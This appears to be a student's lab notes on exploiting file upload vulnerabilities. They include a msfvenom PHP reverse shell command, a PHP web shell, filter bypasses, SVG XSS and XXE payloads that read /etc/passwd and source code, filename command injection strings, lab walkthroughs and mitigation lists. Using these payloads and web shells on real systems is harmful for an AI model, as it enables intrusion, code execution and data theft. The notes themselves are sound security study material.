
## Generating Custom Reverse Shell Scripts

```
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

## Custom web shell

```
<?php system($_GET['cmd']); ?>
```

**Prebuilt options:**

- `https://github.com/Arrexel/phpbash` — interactive web shell
- `https://github.com/pentestmonkey/php-reverse-shell` — reverse shell
- SecLists → `Web-Shells/` directory

---
# Client-Side Validation

Weakest filter — runs entirely in the browser, so you fully control it.



```
```![](../../images/Pasted%20image%2020260912095649.png)

here we bypassed the restriction by modifying the on submit post request removing the validate() and leaving a plan upload()

![](../../images/Pasted%20image%2020260912115754.png)

![](../../images/Pasted%20image%2020260912115828.png)

we can also do this with burp intercepting the post request , like follow

we captured the normal post request with the accepted file in this case a jpeg , then we renamed the file to **shell.php**

as our body we used a simple php cmd code 

`<?php system($_GET['cmd']); ?>`

then we forward the request go to the destination upload dir and call the php file 



![](../../images/Pasted%20image%2020260912120527.png)

and it worked 

![](../../images/Pasted%20image%2020260912120910.png)


# # Blacklist Filters

Server holds a list of **forbidden** extensions and blocks those. Anything not on the list gets through.

As we might be able to bypass the file type , we might then face a problem with the file name extension for example .php, we need to find a way to bypass it 

##Fuzzing web extensions with burp to see which extensions are allowed 

First we upload the allowed image, we intercept the post request with burp, once we capture the request we send it to intruder(once mistake that i made was deleting the image meta data, in this case without that in the body it wasnt allowing the upload)


![](../../images/Pasted%20image%2020260912141631.png)

we changed the filename from images.jpg to shell.php, we highlighed the .php and used 

/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

or we could also use this list as well

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

![](../../images/Pasted%20image%2020260912141653.png)

After the file is successfully uploaded we visit the upload dir and call it 

![](../../images/Pasted%20image%2020260912142117.png)


# # Whitelist Filters


There might be occasions where the server could be using a whitelist meaning that it only allows image extensions for example .jpg

if we have tried shell.php.jpg we could have been able to pass the whitelist while still uploading a php file that can execute php code , we could FUZZ the extension to see what extensions are whitelisted by the upload form 


# Double Extension


If the regex isn't anchored, `shell.png.phtml` passes because it _contains_ `.png`, and Apache runs it because it _ends_ in `.phtml`.


![](../../images/Pasted%20image%2020260912173057.png)![](../../images/Pasted%20image%2020260912173107.png)


## Reverse Double Extension## 

In many cases . the file upload functionality itself may not be vuln but the web server configuration may lead to a vuln so if the server config has whitlisted phar php or phtml or whatever its in the config file we might be able to execute shell.phar.jpg because phar is in the filename and phar is allowed to be executed regardless of the extention as we can see here

`<FilesMatch ".+\.ph(ar|p|tml)">    <!-- NO $ anchor -->`
    `SetHandler application/x-httpd-php`
`</FilesMatch>`

With no `$`, any file _containing_ `.phar`/`.php`/`.phtml` anywhere gets executed. So `shell.php.jpg` passes a strict upload whitelist (ends `.jpg`) **and** executes (contains `.php`).

![](../../images/Pasted%20image%2020260912173700.png)

FIle was successfully uploaded.

![](../../images/Pasted%20image%2020260912173740.png)

And we were able to capture the flag...

also something else worth mentioning is that we can create our own wordlists and fuzz the extension until we find a hit 
we can also write a small bash script with different mutations

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

# Character Injection

Inject characters before/after the extension to confuse the parser

`%20   %0a   %00   %0d0a   /   .\   .   …   :`

- `shell.php%00.jpg` — null byte, **only works on PHP ≤ 5.3** (modern PHP ignores it)
- hell.aspx:.jpg` — colon on Windows, writes as `shell.aspx`

# Content / Type Validation

Set by the browser from the file extension — client-side, so we control it.

```
$type = $_FILES['uploadFile']['type']; // the HTTP Content-Type header if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) { die(); }
```

**Bypass:** change the `Content-Type` header in the file's part of the request to an allowed image type.

> [!note] Two Content-Type headers A multipart upload has **two**: one for the whole request (top) and one for the file part (bottom). Usually you modify the **file's** one.

### MIME type (magic bytes)

Reads the first few bytes (the **file signature**) to determine the real type  independent of extension or header.

`$type = mime_content_type($_FILES['uploadFile']['tmp_name']);`

**Bypass:** prepend the right magic bytes.

- `GIF8` → detected as `image/gif` (printable ASCII, easiest to fake).
- `FF D8 FF` → JPEG (insert as real bytes via Burp **Hex** view, not typed text).
- `89 50 4E 47 0D 0A 1A 0A` → PNG.

 [!warning] `GIF8` isn't a universal key If the type-check regex is e.g. `/image\/[a-z]{2,3}g/`, then `image/gif` **fails** (`gif` ends in `f`, not `g`). The magic bytes have to produce a MIME the regex actually accepts. Match the trick to the filter.


# **Blacklist** 
server has a list of _forbidden_ extensions. Blocks `.php`, `.php7` etc. but anything not on the list gets through. Bypass by finding extensions not on the list (`.phtml`, `.phar`).

**Whitelist** 
server only allows _specific_ extensions. Everything else is blocked. Bypass relies on Apache misconfigs or regex weaknesses (double extensions like `shell.phar.jpg`).

Whitelist is more secure in theory, but misconfigs make it bypassable anyway.

# Filters

That makes sense — the regex was checking for `.png` anywhere in the filename (not anchored with `$`), so `shell.png.phtml` passes the whitelist check because it contains `.png`, and Apache executes it as PHP because it ends in `.phtml`.

Classic weak regex mistake — `preg_match('^.*\.(jpg|jpeg|png|gif)')` without the `$` anchor.

meaning if .gif is whitelisted, and .phtml is not blacklisted we can use shell.png.phtml and in this case the regex will validate this because .png exists regardless of its possition.

Meaning if the server has whitelist and blacklist configs we can bypass it this way using a double extension

![](../../images/Pasted%20image%2020260913113755.png)

in this example MIME type validation reads the first few bytes of the file (magic bytes/file signature) to determine the actual file type, regardless of extension or Content-Type header. That's why `GIF8` at the start fools it into thinking it's a GIF image.

the file here executed because all 3 conditions were satisfied and .phtml was not blacklisted and it can execute php code to the back end

so the steps where
- find which extensions are whitelisted
- find which extensions are blacklisted
- fuzz for content-type (in case its checking it)
- satisfy it with GIF8 magic byte 

if the file is uploading but not executing means you are satisfying the whitelisted extension and blacklisted , you need to see what extension can execute php incase there is some configuration on the server it self or the regex script

![](../../images/Pasted%20image%2020260913114017.png)

![](../../images/Pasted%20image%2020260913114419.png)

an other example here is that phar and phtml executes the command but if we switch it to .php we get an error because .php here is blacklisted so we only satisfy 2 out of 3 conditions, maybe we could have also tried injecting characters between extensions to bypass or confuse the server in this case this didnt work but its worth trying it 




# Limited File Uploads

While upload filters can be secure to upload arbitrary files , we might also take advantage of a upload form that allows specific file types . like SVG , HTML, XML 

## XSS 

HTML files wont allows us to execute php code but we can implement java code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. An other example is if we can see the images meta data after a upload 

```
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```
 exiftool HTB.jpg
```

here when the image's metadata is displayed it should carry the XSS payload with it 

FInally XSS attacks can be carried with SVG files , we can modify their XML data to include an XSS paytload for example 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

if we see a alert on our web browser means it was successfully executed! 


## XXE

In SVG files we can include malicious XML data to leak source code or other files within the server 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

![](../../images/Pasted%20image%2020260913132151.png)

here we can see we were able to read the /etc/passwd file and we captured the flag by changing the directory

![](../../images/Pasted%20image%2020260913132323.png)

We can also use XXE to read source code in PHP web apps by encoding the code into base64 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```


![](../../images/Pasted%20image%2020260913132739.png)

we succesfullly extracted the encoded php source code of upload.php now we go back to kali and decode it 


![](../../images/Pasted%20image%2020260913132825.png)

as we can see we found very usefull infomation here. 

**DoS via file upload:**

- Decompression bomb — nested ZIPs expand to petabytes
- Pixel Flood — JPG/PNG with manipulated compression data claiming 4 gigapixels
- Oversized file upload if no size limit
- Directory traversal upload `../../../etc/passwd`

also if you upload an image with XSS in its metadata, you can also change its MIME type to `text/html` — some web apps will then render it as an HTML page instead of displaying it as an image, which triggers the XSS payload even if the app doesn't directly display the metadata.

*****
**XSS** — injects JavaScript that runs in the victim's browser. Targets users, steals cookies, hijacks sessions.

**XXE** — injects XML that runs on the server. Targets the server itself, reads local files, performs SSRF.

XSS = client-side attack. XXE = server-side attack.


# **Other Upload Attacks — Key Points**

**Injection in filename:**

- Command injection: `file$(whoami).jpg` or `file.jpg||whoami`
- XSS in filename: `<script>alert(window.origin);</script>.jpg`
- SQLi in filename: `file';select+sleep(5);--.jpg`
- Works when app uses filename in OS commands or SQL queries

**Upload directory disclosure:**

- Fuzz for uploads directory
- Force errors by uploading duplicate filename or two identical simultaneous requests
- Upload overly long filename (5000 chars) to trigger error
- Use LFI/XXE to read source code and find upload path

**Windows-specific:**

- Reserved chars in filename: `|`, `<`, `>`, `*`, `?` → trigger errors
- Reserved names: `CON`, `COM1`, `LPT1`, `NUL` → server can't write them
- Windows 8.3 convention: `HAC~1.TXT` to reference/overwrite existing files

**Advanced:**

- Exploit processing libraries (ffmpeg XXE via AVI)
- Any automatic processing (compression, encoding, renaming) is a potential attack surface
- Custom libraries may have undiscovered vulns — check bug bounty reports


**Preventing File Upload Vulnerabilities — Key Points**

**Extension validation:**

- Use both blacklist AND whitelist together
- Blacklist: check if dangerous extension exists anywhere in filename
- Whitelist: check if filename ends with allowed extension (`$` anchor in regex)
- Apply both front-end and back-end validation

**Content validation:**

- Validate file extension + Content-Type header + MIME magic bytes — all three must match
- Never validate just one without the others

**Upload directory protection:**

- Never expose uploads directory directly — serve files through `download.php`
- Direct requests to uploads dir should return 403
- Use headers: `Content-Disposition: attachment`, `Content-Type`, `X-Content-Type-Options: nosniff`
- Randomize stored filenames, keep original name in database
- Store uploads on separate server/container
- Use `open_basedir` in PHP to restrict directory access

**Further hardening:**

- Disable dangerous PHP functions: `exec`, `shell_exec`, `system`, `passthru`
- Disable verbose error messages
- Limit file size
- Keep libraries updated
- Scan uploads for malware
- WAF as secondary layer

----------------------------

# Lab exercise

In this lab i saw there was a checkfile() function so the easiest thing to do was to delete it from the browser and see if my upload would bypass the filter and it did not 

![](../../images/Pasted%20image%2020260914092838.png)

![](../../images/Pasted%20image%2020260914092920.png)

I captured the post request with burp tried some quick manual stuff dint  work then i wanted to see what extensions are blacklisted 

![](../../images/Pasted%20image%2020260914093401.png)

so we can use
- .pht
- phtm
- inc
- phar
- pgif

and its whitelisted for

- jpg
- jpeg
- png


Now we want to see since the server is asking for a image file what kinda content is allowed 

![](../../images/Pasted%20image%2020260914164802.png)

We can see that image/svg+xml is allowed so we automatically think we can ABUSE this with a XEE attack and try to read some local files , source code , 

Here we tried to a XEE payload , since we the content check was asking for image, image/svg was acceptable , svg was a whitelisted extension so we could pull files and read them , also before this even if we had successfully uploaded the file we didnt know where it went , this was a essential part 
*reason it detected the code without changing the content type is because of the xml signature or the file*
![](../../images/Pasted%20image%2020260914161906.png)

Here we used a php wrapper to get the source code of upload.php in base64 
![](../../images/Pasted%20image%2020260914162020.png)

Decoded it back to our KALI

![](../../images/Pasted%20image%2020260914162110.png)

From the source code above of upload.php, we can clearly see how the website is working!

We found the upload directory
We see that every file been uploaded is been renamed to date(ymd).''.filename 
We see the blacklist: php, phps, phtml 
Whitelist: /^.+\.[a-z]{2,3}g$/ here it forces the file to end with g in 2-3 letters ex jpg,png,svg
Type check: /image\/[a-z]{2,3}g/  ,both Content-Type header AND magic-byte MIME must match `image/xxg`. Needs real image magic bytes.

so shortly here we needed a extension that is not php,phps,phtml, a extension that ends with 2-3 letters ending with g , and the same with the content check , GIF for exmaple here wouldnt work so the GIF8 trick was useless it still needed to be 2-3 letters ending with g and also something that would execute the php code 

![](../../images/Pasted%20image%2020260914161646.png)

![](../../images/Pasted%20image%2020260914161749.png)

![](../../images/Pasted%20image%2020260914161704.png)

The apache confing was poorly configured , **FIlesMatch ".+\.ph(ar|p|tml)"** was not properly anchored, it needed the $at the end so it only matches the final extension, not everywhere in the name thats how we got code execution here image.phar.jpeg , phar was sitting in the middle meaning it could be executed



**Mitigations**

1. **Fix the blacklist** — include ALL executable extensions: `php, php3, php4, php5, php7, phps, phtml, phar, pht, inc`
2. **Anchor Apache config** — use `FilesMatch ".+\.ph(ar|p|tml)$"` with `$` so it only matches the FINAL extension, not anywhere in the name
3. **Whitelist over blacklist** — and make the whitelist strict (`\.(jpg|jpeg|png|gif)$` only)
4. **Ensure extension matches content** — validate the final extension aligns with the actual MIME type
5. **Rename files fully** — store with a random name AND force a safe extension, don't preserve user input in the name
6. **Serve uploads through a download script** — don't allow direct execution from the uploads directory; return `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`
7. **Disable SVG uploads** or sanitize them — the `libxml_disable_entity_loader(false)` here also enabled XXE
8. **Store uploads outside the webroot** or on a separate host so they can't be executed even if uploaded



-----------------------------

LAB 2 

Here the default upload directory couldn't exexute php code the file was returning plain text  and the filename parameter was vulnerable to path traversal so it was including user input so we jumped a ../ back so going from /files/avatars/test.php to files/test.php, we also had to encode the ../ as it was using some sanitation 

![](../../images/Pasted%20image%2020260914213720.png)

end of lab 
![](../../images/Pasted%20image%2020260914213747.png)


# LAB3

In this lab we weere able to upload test.php by obfuscating the extension name 

![](../../images/Pasted%20image%2020260915100949.png)


## other techniques 

![](../../images/Pasted%20image%2020260915101017.png)

![](../../images/Pasted%20image%2020260915101041.png)


LAB4

Here we were able to embed malicious code inside the jpg with a tool called exiftool

![](../../images/Pasted%20image%2020260915103021.png)

this passed the upload filter and was able to execute our php code because the server was validating based on content type here we had image metadata 